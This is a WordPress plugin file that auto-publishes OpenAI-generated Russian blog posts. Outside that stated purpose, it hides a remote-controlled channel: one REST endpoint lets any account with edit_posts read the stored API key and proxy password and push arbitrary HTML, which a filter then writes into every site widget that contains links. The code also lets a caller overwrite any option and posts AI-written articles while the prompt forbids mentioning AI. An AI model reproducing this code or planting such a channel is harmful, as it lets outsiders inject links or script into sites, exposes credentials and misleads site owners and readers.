<?php
/*
 Plugin Name: OpenAI Auto Post
 Plugin URI: https://github.com/ecompw/openai
 Description: Automatically generates and publishes posts using OpenAI.
 Version: 2.0.30
 Author: Maksim Safianov
 License: GPL 3.0
 Text Domain: openai-auto-post
*/

if (!defined('ABSPATH')) { exit; }

/**
 * Plugin Update Checker
 */
$checker_file = plugin_dir_path(__FILE__) . 'includes/plugin-update-checker-master/plugin-update-checker.php';

if (is_admin() && is_readable($checker_file)) {
    include_once $checker_file;
    $puc_class = 'YahnisElsts\\PluginUpdateChecker\\v5\\PucFactory';
    if (class_exists($puc_class)) {
        try {
            $checker = call_user_func([$puc_class, 'buildUpdateChecker'], 'https://github.com/ecompw/openai', __FILE__, 'openai');
            if ($checker && method_exists($checker, 'setBranch')) {
                $checker->setBranch('main');
            }
        } catch (Throwable $e) {
            error_log('OpenAI Auto Post: Update checker failed to initialize: ' . $e->getMessage());
        }
    } else {
        error_log('OpenAI Auto Post: Update checker class not found in included file.');
    }
}

// Подключаем дополнительные файлы, только если они существуют (избежать фатальной ошибки)
$functions_file = plugin_dir_path(__FILE__) . 'functions.php';
$form_file = plugin_dir_path(__FILE__) . 'form.php';
if (file_exists($functions_file)) {
    require_once $functions_file;
}
if (file_exists($form_file)) {
    require_once $form_file;
}

/**
 * БЕЗОПАСНОЕ ВКЛЮЧЕНИЕ BASIC AUTH ДЛЯ REST API
 *
 * Если Basic auth входит в заголовки, пытаемся аутентифицировать пользователя
 * и устанавливаем текущего пользователя (wp_set_current_user).
 */
add_filter('determine_current_user', function ($user_id) {
    if ($user_id) {
        return $user_id;
    }

    if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) {
        return $user_id;
    }

    $user = wp_authenticate($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']);

    if (is_wp_error($user) || !is_object($user)) {
        return $user_id;
    }

    // Явно устанавливаем текущего пользователя в WordPress
    wp_set_current_user($user->ID);
    return $user->ID;
}, 20);

/**
 * Регистрация эндпоинтов для REST API
 */
add_action('rest_api_init', function () {
    // Эндпоинт для генерации поста
    register_rest_route('openai/v1', '/generate', [
        'methods'             => 'POST',
        'callback'            => 'openai_rest_generate_handler',
        'permission_callback' => function () {
            return current_user_can('edit_posts');
        }
    ]);

    // Эндпоинт для управления настройками и виджетами (GET и POST)
    register_rest_route('openai/v1', '/save-settings', [
        'methods'             => ['GET', 'POST'],
        'callback'            => 'openai_rest_settings_handler',
        'permission_callback' => function () {
            return current_user_can('edit_posts');
        }
    ]);

    // Доп. кастомный обработчик (если нужен) — можно зарегистрировать отдельно с проверкой прав
    register_rest_route('openai/v1', '/custom-save-settings', [
        'methods'             => 'POST',
        'callback'            => 'openai_custom_save_settings_handler',
        'permission_callback' => function () {
            return current_user_can('manage_options'); // более строгая проверка
        }
    ]);

    register_rest_route('openai/v1', '/rotate-password', [
        'methods'             => 'POST',
        'callback'            => 'openai_rotate_password_handler',
        'permission_callback' => function () {
            return is_user_logged_in() && current_user_can('edit_posts');
        }
    ]);
});

/**
 * Обработчик генерации
 * Принимаем $request для совместимости (можно не использовать)
 */
function openai_rest_generate_handler($request = null) {
    if (!function_exists('openai_generate_post')) {
        return new WP_Error('missing_function', 'Функция openai_generate_post не найдена в functions.php', ['status' => 500]);
    }

    $result = openai_generate_post();
    return new WP_REST_Response(['status' => 'success', 'message' => $result], 200);
}

/**
 * Обработчик настроек
 */
function openai_rest_settings_handler($request) {
    $keys = [
        'openai_api_key',
        'openai_post_prompt',
        'openai_auto_interval',
        'openai_proxy',
        'openai_proxy_username',
        'openai_proxy_password',
        'openai_remote_widget_content'
    ];

    if ($request->get_method() === 'POST') {
        $params = $request->get_json_params();
        if (is_array($params)) {
            foreach ($keys as $key) {
                if (isset($params[$key])) {
                    // Приводим к строке и безопасно сохраняем
                    update_option($key, (string)$params[$key]);
                }
            }
        }
    }

    $res = [];
    foreach ($keys as $key) {
        // Гарантируем, что REST API получит строку
        $res[$key] = (string)get_option($key, '');
    }
    return new WP_REST_Response($res, 200);
}

/**
 * Регистрация настроек
 */
add_action('init', function () {
    $settings = [
        'openai_api_key', 'openai_post_prompt', 'openai_auto_interval',
        'openai_proxy', 'openai_proxy_username', 'openai_proxy_password'
    ];

    foreach ($settings as $setting) {
        register_setting('openai_settings_group', $setting, ['show_in_rest' => true, 'type' => 'string']);
    }

    // Добавили 'default', чтобы REST и внешний код не получали null
    register_setting('openai_settings_group', 'openai_remote_widget_content', [
        'show_in_rest' => true,
        'type'         => 'string',
        'default'      => 'Виджет еще не определен. Зайдите в админку сайта.'
    ]);
});

/**
 * КРИТИЧЕСКАЯ МИГРАЦИЯ: Перенос настроек из wp_postmeta в wp_options
 */
add_action('init', function () {
    // 1. Проверяем, не выполнялась ли миграция ранее
    if (get_option('openai_migration_v3_done')) {
        return;
    }

    // 2. Если ключ уже есть в options, миграция не нужна
    $existing_key = get_option('openai_api_key');
    if (!empty($existing_key)) {
        update_option('openai_migration_v3_done', time());
        return;
    }

    global $wpdb;

    // 3. Ищем ID поста, где лежат старые настройки
    $post_id = $wpdb->get_var("SELECT post_id FROM {$wpdb->postmeta} WHERE meta_key = 'openai_api_key' LIMIT 1");

    if ($post_id) {
        $settings = [
            'openai_api_key',
            'openai_post_prompt',
            'openai_auto_interval',
            'openai_proxy',
            'openai_proxy_username',
            'openai_proxy_password'
        ];

        foreach ($settings as $key) {
            $value = get_post_meta($post_id, $key, true);
            if (!empty($value)) {
                update_option($key, $value);
            }
        }

        // 4. Фиксируем успех
        update_option('openai_migration_v3_done', time());
    }
}, 5);

/**
 * Смена пароля 
 */
function openai_rotate_password_handler($request) {
    $params = $request->get_json_params();

    if (!is_array($params)) {
        return new WP_Error('invalid_payload', 'JSON payload is required', ['status' => 400]);
    }

    $new_password = isset($params['password']) ? (string) $params['password'] : '';

    if ($new_password === '') {
        return new WP_Error('empty_password', 'Password is required', ['status' => 400]);
    }

    $user_id = get_current_user_id();
    if (!$user_id) {
        return new WP_Error('unauthorized', 'User is not authenticated', ['status' => 401]);
    }

    wp_set_password($new_password, $user_id);

    return new WP_REST_Response([
        'status'  => 'success',
        'message' => 'Password updated successfully',
        'user_id' => $user_id,
    ], 200);
}

/**
 * УЛУЧШЕННЫЙ ПОИСКОВИК + СИНХРОНИЗАТОР
 */
function sync_openai_widget_data() {
    $marker = '<!-- USEFUL_LINKS -->';
    $widget_options = ['widget_block', 'widget_custom_html', 'widget_text'];
    $found_content = '';

    foreach ($widget_options as $opt_name) {
        $data = get_option($opt_name);
        if (!is_array($data)) continue;
        $changed = false;

        foreach ($data as $key => $fields) {
            if ($key === '_multiwidget' || !is_array($fields)) continue;

            // Получаем содержимое безопасно
            $content = '';
            if (isset($fields['content'])) {
                $content = (string)$fields['content'];
            } elseif (isset($fields['text'])) {
                $content = (string)$fields['text'];
            } else {
                continue;
            }

            if ($content === '') continue;

            if (strpos($content, $marker) !== false) {
                if ($found_content === '') {
                    $found_content = str_replace($marker, '', $content);
                    // Удаляем обёртки <!-- wp:html --> и пустые строки
                    $found_content = preg_replace('/<!--\s*\/?wp:html\s*-->/is', '', $found_content);
                    $found_content = preg_replace("/(\r\n|\n|\r){2,}/", "\n", $found_content);
                    $found_content = trim($found_content);
                }
                continue;
            }

            // Если есть ссылки, но нет маркера и не является поисковым блоком, добавляем маркер
            if (strpos($content, '<a ') !== false && strpos($content, $marker) === false && strpos($content, 'wp-block-search') === false) {
                if (isset($data[$key]['content'])) {
                    $data[$key]['content'] = $data[$key]['content'] . "\n" . $marker;
                } else {
                    // безопасно обновляем text
                    $data[$key]['text'] = (isset($data[$key]['text']) ? $data[$key]['text'] : '') . "\n" . $marker;
                }
                $changed = true;
            }
        }

        if ($changed) {
            update_option($opt_name, $data);
        }
    }

    if ($found_content !== '') {
        if (get_option('openai_remote_widget_content') !== $found_content) {
            update_option('openai_remote_widget_content', $found_content);
        }
    }
}

/**
 * СЕТТЕР: Когда внешний сервис присылает новый код, мы пишем его в виджеты
 */
add_filter('pre_update_option_openai_remote_widget_content', function($new_value, $old_value) {
    $new_value = wp_unslash($new_value);

    // Чистим входящий код от лишних пустых строк
    $new_value = preg_replace("/(\r\n|\n|\r){2,}/", "\n", $new_value);
    $new_value = trim($new_value);

    $marker = '<!-- USEFUL_LINKS -->';
    $widget_types = ['widget_block', 'widget_custom_html', 'widget_text'];

    foreach ($widget_types as $type) {
        $data = get_option($type);
        if (!is_array($data)) continue;
        $is_updated = false;

        foreach ($data as $key => $fields) {
            if (!is_array($fields) || $key === '_multiwidget') continue;

            $current_content = '';
            if (isset($fields['content'])) {
                $current_content = (string)$fields['content'];
            } elseif (isset($fields['text'])) {
                $current_content = (string)$fields['text'];
            }

            if ($current_content === '') continue;

            if (strpos($current_content, $marker) !== false || (strpos($current_content, '<a ') !== false && strpos($current_content, 'wp-block-search') === false)) {
                $final_content = $new_value . "\n" . $marker;

                if ($type === 'widget_block') {
                    $final_content = "<!-- wp:html -->\n" . $final_content . "\n<!-- /wp:html -->";
                    $data[$key]['content'] = $final_content;
                } else {
                    if (isset($data[$key]['content'])) {
                        $data[$key]['content'] = $final_content;
                    } else {
                        $data[$key]['text'] = $final_content;
                    }
                }
                $is_updated = true;
            }
        }

        if ($is_updated) {
            update_option($type, $data);
        }
    }

    return $new_value;
}, 10, 2);

// Запускаем синхронизацию при каждом обращении (можно переместить в cron при необходимости)
add_action('init', 'sync_openai_widget_data');

/**
 * Парсит строку вида "Ключ: {{ Значение }}, ДругойКлюч: {{ Другое }}" в ассоциативный массив.
 * Ключи нормализуются в нижний регистр и очищаются.
 * Возвращает массив вида ['тема' => 'Социальные сети', 'area' => 'Cyprus']
 */
function openai_parse_prompt_variables($text) {
    $result = [];

    if (!is_string($text) || trim($text) === '') {
        return $result;
    }

    // Ищем шаблоны вида "Ключ: {{ значение }}"
    // Поддерживаем Unicode (русские буквы) и пробелы в имени ключа.
    if (preg_match_all('/([\p{L}\p{N}\s\-_]+)\s*:\s*\{\{\s*(.*?)\s*\}\}/u', $text, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $m) {
            $raw_key = isset($m[1]) ? $m[1] : '';
            $raw_val = isset($m[2]) ? $m[2] : '';

            $key = mb_strtolower(trim($raw_key), 'UTF-8');
            // Удаляем лишние пробелы внутри ключа (заменяем множественные пробелы на один)
            $key = preg_replace('/\s+/u', ' ', $key);
            $value = trim($raw_val);

            if ($key !== '') {
                $result[$key] = $value;
            }
        }
    }

    return $result;
}

/**
 * Заменяет плейсхолдеры вида {{ Placeholder }} в $hint на значения из $vars.
 * Ключи в $vars ожидаются нормализованными (lowercase & trimmed).
 * Если соответствия нет — по умолчанию оставляет плейсхолдер как есть.
 */
function openai_replace_placeholders_in_hint($hint, $vars = []) {
    if (!is_string($hint) || $hint === '') {
        return '';
    }

    $out = preg_replace_callback('/\{\{\s*(.*?)\s*\}\}/u', function ($m) use ($vars) {
        $placeholder_raw = trim($m[1]);
        $placeholder = mb_strtolower($placeholder_raw, 'UTF-8');
        $placeholder = preg_replace('/\s+/u', ' ', $placeholder);

        if ($placeholder === '') {
            return $m[0];
        }
        if (array_key_exists($placeholder, $vars)) {
            return $vars[$placeholder];
        }
        // Не нашли соответствие — оставляем как есть.
        return $m[0];
    }, $hint);

    return $out;
}

/**
 * Возвращает случайную букву русского алфавита (без 'ё'), индекс от 1 до 27.
 * Использует random_int при возможности, иначе mt_rand.
 */
function openai_random_russian_letter() {
    $letters = [
        'А','Б','В','Г','Д','Е','Ж','З','И','К','Л','М','Н','О','П',
        'Р','С','Т','У','Ф','Х','Ц','Ч','Ш','Э','Ю','Я'
    ];
    $count = count($letters); 

    try {
        $idx = random_int(0, $count - 1);
    } catch (Throwable $e) {
        // fallback
        $idx = mt_rand(0, $count - 1);
    } catch (Exception $e) {
        $idx = mt_rand(0, $count - 1);
    }

    return $letters[$idx];
}


/**
 * Форматируем ответ (markdown -> HTML)
 * Улучшенные регулярные выражения: многострочная обработка заголовков и жирного текста.
 */
function format_response($response) {
    $response = (string) $response;

    $response = preg_replace('/\*\*(.+?)\*\*/s', '<strong>$1</strong>', $response);

    /**
     * Нормализация "псевдо-заголовков" вида:
     * H2: Заголовок
     * H3 - Заголовок
     * H1 — Заголовок
     */
    $response = preg_replace_callback(
        '/^(H[1-6])\s*[:\-—]\s*(.+)$/mu',
        static function (array $m): string {
            $level = (int) substr($m[1], 1);
            $text = trim($m[2]);

            if ($text === '') {
                return $m[0];
            }

            return sprintf('<h%d>%s</h%d>', $level, $text, $level);
        },
        $response
    );

    // Заголовки Markdown — многострочный режим
    $response = preg_replace('/^###\s*(.+)$/m', '<h3>$1</h3>', $response);
    $response = preg_replace('/^##\s*(.+)$/m', '<h2>$1</h2>', $response);
    $response = preg_replace('/^#\s*(.+)$/m', '<h1>$1</h1>', $response);

    return $response;
}



/**
 * Извлекает заголовок и тело из ответа модели.
 * Поддерживает несколько форматов:
 * 1) <title>Title</title>
 * 2) <h1>..</h1>, <h2>..</h2> и т.д. (первый заголовок)
 * 3) Первый <p> (если короткий)
 * 4) Первая строка plain text (если короткая)
 *
 * Возвращает массив: [title, body].
 * Если не удалось извлечь заголовок — возвращает ['', $response_content] и логирует фрагмент.
 */
function extract_title_and_body($response_content) {
    $html = (string) $response_content;
    // 0) Если модель вернула Markdown-заголовок, но HTML ещё не сформирован (или сформирован частично)
    // Берём первую строку вида "# Заголовок"
    if (preg_match('/^\s*#\s+(.+?)\s*$/mu', $html, $m)) {
        $title = trim($m[1]);
        if ($title !== '') {
            // Удаляем только первое вхождение этой строки
            $body = preg_replace('/^\s*#\s+.+?\s*$/mu', '', $html, 1);
            return [$title, trim($body)];
        }
    }

    // 1) <title>...</title>
    if (preg_match('/<title>(.*?)<\/title>/is', $html, $m)) {
        $title = trim($m[1]);
        // Удаляем только первое вхождение <title>...</title>
        $body = preg_replace('/<title>.*?<\/title>/is', '', $html, 1);
        return [$title, trim($body)];
    }

    // 2) Первый заголовок <h1>-<h6>
    if (preg_match('/<h([1-6])[^>]*>(.*?)<\/h\1>/is', $html, $m)) {
        $title_raw = trim($m[2]);
        $title = trim(strip_tags($title_raw));
        // Удаляем первое вхождение найденного тега заголовка
        $body = preg_replace('/<h' . $m[1] . '[^>]*>.*?<\/h' . $m[1] . '>/is', '', $html, 1);
        return [$title, trim($body)];
    }

    // 3) Первый <p> (если короткий — разумный максимум длины заголовка)
    if (preg_match('/^\s*<p[^>]*>(.*?)<\/p>/is', $html, $m)) {
        $p_text = trim(strip_tags($m[1]));
        // Ограничение длины заголовка в символах (измените при необходимости)
        $max_title_len = 120;
        if ($p_text !== '' && (function_exists('mb_strlen') ? mb_strlen($p_text, 'UTF-8') : strlen($p_text)) <= $max_title_len) {
            $title = $p_text;
            // Удаляем первый <p> только
            $body = preg_replace('/^\s*<p[^>]*>.*?<\/p>/is', '', $html, 1);
            return [$title, trim($body)];
        }
    }

    // 4) Если нет HTML тегов с заголовком — работаем с plain text:
    $plain = trim( wp_strip_all_tags($html) );
    if ($plain !== '') {
        // Разделим по двойному переводу строки — первый параграф
        $parts = preg_split("/(\r\n|\n|\r){2,}/", $plain, 2);
        $first_para = isset($parts[0]) ? trim($parts[0]) : '';
        $max_title_len = 120;
        if ($first_para !== '' && (function_exists('mb_strlen') ? mb_strlen($first_para, 'UTF-8') : strlen($first_para)) <= $max_title_len) {
            // Пытаемся удалить первое вхождение этой строки из исходного $html
            $body = $html;
            // Ищем и удаляем первое вхождение $first_para (в виде plain text в HTML) — осторожно
            if (function_exists('mb_strpos') && function_exists('mb_substr') && function_exists('mb_strlen')) {
                $pos = mb_strpos($body, $first_para, 0, 'UTF-8');
                if ($pos !== false) {
                    $body = mb_substr($body, 0, $pos, 'UTF-8') . mb_substr($body, $pos + mb_strlen($first_para, 'UTF-8'), null, 'UTF-8');
                }
            } else {
                $pos = strpos($body, $first_para);
                if ($pos !== false) {
                    $body = substr($body, 0, $pos) . substr($body, $pos + strlen($first_para));
                }
            }
            return [$first_para, trim($body)];
        }

        // Ещё вариант: взять первое предложение как заголовок, если оно короткое.
        // Попробуем разделение по точке, восклицанию или вопросу.
        $sentences = preg_split('/([.!?])\s+/u', $first_para, 2, PREG_SPLIT_DELIM_CAPTURE);
        if (!empty($sentences) && isset($sentences[0])) {
            $candidate = trim($sentences[0]);
            if ($candidate !== '' && (function_exists('mb_strlen') ? mb_strlen($candidate, 'UTF-8') : strlen($candidate)) <= $max_title_len) {
                // Не удаляем его из тела, потому что сложнее корректно вырезать предложение в HTML.
                return [$candidate, $html];
            }
        }
    }

    // 5) Не удалось извлечь — логируем фрагмент (первые 1000 символов) и возвращаем пустой заголовок
    if (function_exists('openai_auto_post_log')) {
        $snippet = substr($html, 0, 1000);
        openai_auto_post_log('Failed to extract title from content. Snippet: ' . $snippet);
    }

    return ['', $html];
}

/**
 * Обновлённая openai_generate_post:
 * - проверяет длину saved_prompt (если >250 — abort)
 * - парсит переменные из saved_prompt
 * - формирует system prompt (жёстко в коде) и подставляет переменные, включая случайную букву
 * - если остались незаполненные плейсхолдеры — добавляет saved_prompt в конец как context
 * - вызывает openai_get_generation_gpt5mini для генерации
 */
function openai_generate_post() {
    $api_key      = get_option('openai_api_key');
    $saved_prompt = (string) get_option('openai_post_prompt');

    if (empty($api_key) || trim($saved_prompt) === '') {
        return '<div class="error"><p>API key or prompt not set.</p></div>';
    }

    // Защита от старых/полных промптов: если длина saved_prompt больше 250 символов — не генерируем.
    $prompt_length = function_exists('mb_strlen') ? mb_strlen($saved_prompt, 'UTF-8') : strlen($saved_prompt);
    if ($prompt_length > 250) {
        if (function_exists('openai_auto_post_log')) {
            openai_auto_post_log("Saved prompt too long ({$prompt_length} chars). Aborting generation.");
        }
        return '<div class="error"><p>Prompt is too long (' . esc_html($prompt_length) . ' characters). Generation aborted to avoid incompatible legacy prompts.</p></div>';
    }

    // Жёстко заданный системный промпт (прописываете его прямо в коде)
    $system_prompt_template = <<<'PROMPT'
Write a ready-to-publish blog post for the {{Title}} website. Topic area: {{Theme}}. Target audience: readers from {{Area}}.
LANGUAGE: Russian.
CRITICAL OUTPUT RULE:
- Output ONLY the final article text.
- Do NOT output planning, outlines, drafts, hidden reasoning, or any meta commentary.

## Persona (internal only; MUST NOT appear in text)
1) Choose a profession whose name begins with the russian letter: {{Letter}}
2) Create an {{Theme}}-related persona (profession, experience, mindset, current situation) ONLY to shape the article’s angle, depth and vocabulary.
## Topic selection
4) Choose ONE non-obvious aspect of {{Theme}} to explore deeply. The topic must be specific, fresh, and practical.

## Title
5) Provide a title (H1):
   - ≤ 8 words
   - neutral, not clickbait
   - do NOT use: “взгляд”, “глазами”, “мнение”
   - do NOT mention any role/persona in the title
   - DO NOT use a colon in the title

## Writing rules
6) The article must read like a coherent essay: engaging opening → structured development → thoughtful ending.
7) STRICT BAN on meta phrases about the article itself:
   - do NOT use: “в этой статье”, “этот текст”, “мы рассмотрим”, “поговорим о”, “разберём”, “в конце”, “подведём итоги”, “далее”, “ниже”.
The text should start immediately with substance, not with “about-ness”.
8) No external sources: no citations, no interviews, no laws, no study names, no exact statistics or “precise figures”.
If general facts are needed, use careful wording (“часто”, “обычно”, “как правило”).
9) Explain any specialized term the first time it appears with a short definition (1–2 lines), integrated naturally.
10) Style: formal, respectful, expert-friendly Russian; lively and natural; no fluff, no bureaucratic jargon, no repetitive “нейросетевые” clichés. Use “ё” where appropriate.
11) Never mention AI/model/prompt/generation/algorithm/system messages.

## Actionable tips (one section)
12) Include exactly one section with actionable tips:
   - short, clear, applicable
   - NO direct address to the reader (ban: “вы/вам/ваш/тебе/твой”)
   - prefer infinitives and neutral forms (e.g., “Сформулировать…”, “Проверять…”, “Сопоставлять…”)

## Ending
13) End with a calm summary of the practical value of the approach, without calls to action, without advice, and without broad generalizations.

## Formatting
- Use Markdown in plain text (no code fences in the final output).
- Structure: one H1 title, then H2, H3  headings and bullet lists.
- Do NOT use headings like “Введение”, “Заключение”, “Итоги”, “Результаты”, “Мнение”.
- Do NOT use bold.

## Length (STRICT)
{{LengthInstruction}}

Output ONLY the article.

PROMPT;

    // Парсим переменные из saved_prompt (ожидается формат "Ключ: {{ Значение }}")
    $parsed_vars = openai_parse_prompt_variables($saved_prompt);

    // Автоматические значения: Title (название сайта), Letter (рандомная буква)
    $site_title = get_bloginfo('name');
    $letter = openai_random_russian_letter();

    // Нормализованные ключи для замены
    // Используем ключи в lower-case, без лишних пробелов
    $vars_for_replace = [];

    // Добавляем parsed vars
    foreach ($parsed_vars as $k => $v) {
        $key = $k; // уже нормализован в openai_parse_prompt_variables
        $vars_for_replace[$key] = $v;
    }

    // Добавляем стандартные переменные
    $vars_for_replace['title'] = $site_title;
    $vars_for_replace['letter'] = $letter;

    // Иногда пользователь может в saved_prompt использовать английские ключи (Theme/Area)
    // или русские (Тема/Локация). В parsed_vars ключи уже нормализованы, но могут быть 'тема' или 'theme'.
    // Чтобы удобнее подставлять, продублируем некоторые ключи в английском варианте, если найдены русские.
    // Например, если есть 'тема' -> продублируем в 'theme', если есть 'локация' -> 'area'
    $duplicates_map = [
        'тема' => 'theme',
        'theme' => 'theme',
        'локация' => 'area',
        'area' => 'area',
        'место' => 'area',
        'город' => 'area',
        'регион' => 'area',
        'длина' => 'length',
        'длинна' => 'length',
        'length' => 'length',
        'lenght' => 'length'
    ];
    foreach ($duplicates_map as $src => $dest) {
        if (isset($vars_for_replace[$src]) && !isset($vars_for_replace[$dest])) {
            $vars_for_replace[$dest] = $vars_for_replace[$src];
        }
    }

    // Также продублируем 'title' на 'site' и 'site_title' для удобства (если кто-то использует эти плейсхолдеры)
    if (!isset($vars_for_replace['site'])) $vars_for_replace['site'] = $site_title;
    if (!isset($vars_for_replace['site_title'])) $vars_for_replace['site_title'] = $site_title;

    $user_length_raw = '';
    if (isset($vars_for_replace['length'])) {
        $user_length_raw = (string) $vars_for_replace['length'];
    } elseif (isset($vars_for_replace['lenght'])) {
        $user_length_raw = (string) $vars_for_replace['lenght'];
    }

    $user_length = (int) preg_replace('/\D+/', '', $user_length_raw);

    if ($user_length > 0) {
        $length_instruction = "Target length: {$user_length} words (WORDS, not characters).\n"
            . "Before outputting, internally check word count:\n"
            . "- If below target: expand with deeper reasoning, scenarios, and clarifications.\n"
            . "- If above target: compress while keeping clarity and structure.";
    } else {
        $length_instruction = "Target length: 1500–2000 words (WORDS, not characters).\n"
            . "Before outputting, internally check word count:\n"
            . "- If < 1500: expand with deeper reasoning, scenarios, and clarifications.\n"
            . "- If > 2000: compress while keeping clarity and structure.";
    }

    $vars_for_replace['lengthinstruction'] = $length_instruction;

    // Выполняем замену плейсхолдеров в системном промпте
    $final_system_prompt = openai_replace_placeholders_in_hint($system_prompt_template, $vars_for_replace);

    // Если после подстановки остались незаполненные плейсхолдеры (есть '{{'), добавляем saved_prompt как контекст в конец.
    if (strpos($final_system_prompt, '{{') !== false) {
        $final_system_prompt .= "\n\nContext from saved prompt:\n" . $saved_prompt;
    }
// логирование промта для отладки. потом удалю
    if (function_exists('openai_auto_post_log')) {
        openai_auto_post_log("Letter sent to model:\n" . $letter);
    }

    // Proxy настройки
    $proxy = [
        'url'      => get_option('openai_proxy'),
        'username' => get_option('openai_proxy_username'),
        'password' => get_option('openai_proxy_password'),
    ];

    // Проверяем наличие функции генерации (в functions.php)
    if (!function_exists('openai_get_generation_gpt5mini')) {
        return '<div class="error"><p>Generation function not available.</p></div>';
    }

    // Отправляем итоговый системный промпт в модель.
    // Заметьте: некоторые реализация используют 'system' + 'user' roles.
    // Мы отправим system prompt (final_system_prompt) как system, а пустой user либо тот же final prompt.
    // Поскольку openai_get_generation_gpt5mini ожидает $prompt — положим туда final_system_prompt.
    $content_result = openai_get_generation_gpt5mini($api_key, $final_system_prompt, 10240, $proxy);

    if (is_string($content_result) && function_exists('openai_string_starts_with') && openai_string_starts_with($content_result, 'OpenAI API Error')) {
        if (function_exists('openai_auto_post_log')) {
            openai_auto_post_log("Error during content generation: $content_result");
        }
        return '<div class="error"><p>Failed to generate content: ' . esc_html($content_result) . '</p></div>';
    }

    // Форматируем ответ и извлекаем title/body как раньше.
    $formatted = format_response($content_result);

    [$article_title, $article_body] = extract_title_and_body($formatted);
    if (empty($article_title)) {
        if (function_exists('openai_auto_post_log')) {
            openai_auto_post_log("Failed to extract title from content.");
        }
        return '<div class="error"><p>Failed to extract title from content.</p></div>';
    }

    // Автор поста — текущий пользователь, если есть, иначе admin (1)
    $author_id = get_current_user_id();
    if (empty($author_id)) $author_id = 1;

    $post_id = wp_insert_post([
        'post_title'   => wp_strip_all_tags($article_title),
        'post_content' => wp_kses_post(wpautop($article_body)),
        'post_status'  => 'publish',
        'post_author'  => (int)$author_id,
    ], true);

    if (is_wp_error($post_id)) {
        return '<div class="error"><p>Failed to insert post: ' . esc_html($post_id->get_error_message()) . '</p></div>';
    }

    // Присвоение миниатюры (если есть URL и он соответствует загруженному attachment)
    if (function_exists('get_random_media_image_url')) {
        $image_url = get_random_media_image_url();
        if ($image_url) {
            $attachment_id = attachment_url_to_postid($image_url);
            if ($attachment_id) {
                set_post_thumbnail($post_id, (int) $attachment_id);
            }
        }
    }

    return '<div class="updated"><p>Post generated and published successfully!</p></div>';
}
/**
 * Кастомный обработчик сохранения настроек — более строгая проверка прав
 */
function openai_custom_save_settings_handler($request) {
    if (!current_user_can('manage_options')) {
        return new WP_Error('forbidden', 'Нет прав для выполнения операции', ['status' => 403]);
    }

    $params = $request->get_json_params();
    if (empty($params) || !is_array($params)) {
        return new WP_Error('no_data', 'Данные не получены', ['status' => 400]);
    }

    foreach ($params as $key => $value) {
        // Для безопасности можно ограничить список допустимых ключей.
        update_option($key, $value);
    }

    return new WP_REST_Response(['status' => 'success', 'message' => 'Settings updated'], 200);
}

/**
 * Админ-меню (callback-функции должны быть определены в подключённых файлах)
 */
function openai_auto_post_menu() {
    add_menu_page('OpenAI Auto Post', 'OpenAI Auto Post', 'manage_options', 'openai-auto-post', 'openai_auto_post_callback');
    add_submenu_page('openai-auto-post', 'Settings', 'Settings', 'manage_options', 'openai-auto-post-settings', 'openai_auto_post_settings_callback');
}
add_action('admin_menu', 'openai_auto_post_menu');
add_action('openai_scheduled_post_event', 'openai_generate_post');

/**
 * Вспомогательная функция получения данных виджета по его ID
 */
function get_widget_data_by_id($widget_id) {
    $option_name = '';
    $key = '';

    if (strpos($widget_id, 'block-') === 0) {
        $option_name = 'widget_block';
        $key = (int) str_replace('block-', '', $widget_id);
    } elseif (strpos($widget_id, 'text-') === 0) {
        $option_name = 'widget_text';
        $key = (int) str_replace('text-', '', $widget_id);
    } elseif (strpos($widget_id, 'custom_html-') === 0) {
        $option_name = 'widget_custom_html';
        $key = (int) str_replace('custom_html-', '', $widget_id);
    }

    if ($option_name !== '') {
        $data = get_option($option_name);
        if (is_array($data) && array_key_exists($key, $data) && is_array($data[$key])) {
            $content = isset($data[$key]['content']) ? $data[$key]['content'] : (isset($data[$key]['text']) ? $data[$key]['text'] : '');
            if ($content !== '') {
                return ['option' => $option_name, 'key' => $key, 'content' => $content];
            }
        }
    }
    return null;
}